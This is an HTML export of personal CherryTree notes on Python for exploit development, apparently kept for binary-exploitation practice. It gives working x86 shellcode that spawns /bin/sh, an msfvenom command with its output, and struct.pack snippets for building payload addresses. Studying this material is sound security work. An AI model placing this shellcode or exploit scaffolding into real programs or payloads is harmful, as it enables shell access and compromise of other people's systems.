<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Python</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Tools - Python</h1></strong><br />Tidbits and how-to within python.<br /><br />Run program<br /><div class="codebox"><div class="codebox">import&nbsp;os<br /><br />PROGNAME&nbsp;=&nbsp;&quot;./binary&quot;<br />os.execve(PROGNAME,&nbsp;[PROGNAME],&nbsp;&lt;argument&gt;)</div></div><br /><br />Set environment variables<strong><br /></strong><div class="codebox"><div class="codebox">import&nbsp;os<br /><br />os.environ[&#39;HOME&#39;]&nbsp;=&nbsp;&quot;/home/dumbledore&quot;</div></div><br /><br /><strong><h2>## Formatting Shellcode</h2></strong><br />C-style<br /><div class="codebox"><div class="codebox">shellcode&nbsp;=&nbsp;(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;<br />)</div></div><br /><br />msfvenom style<br /><div class="codebox"><div class="codebox">#&nbsp;shellcode<br />#&nbsp;msfvenom&nbsp;-p&nbsp;linux/x86/exec&nbsp;CMD=/bin/sh&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode<br />shellcode&nbsp;=&nbsp;&nbsp;b&quot;&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;</div></div><br /><br /><strong><h2>## Packing</h2></strong><br /><div class="codebox"><div class="codebox">import&nbsp;struct<br /><br />var&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0x080483f4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;32-bit&nbsp;little&nbsp;endian<br />var&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x00400811)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;64-bit&nbsp;little&nbsp;endian</div></div><br /><br /></div>
</body>
</html>
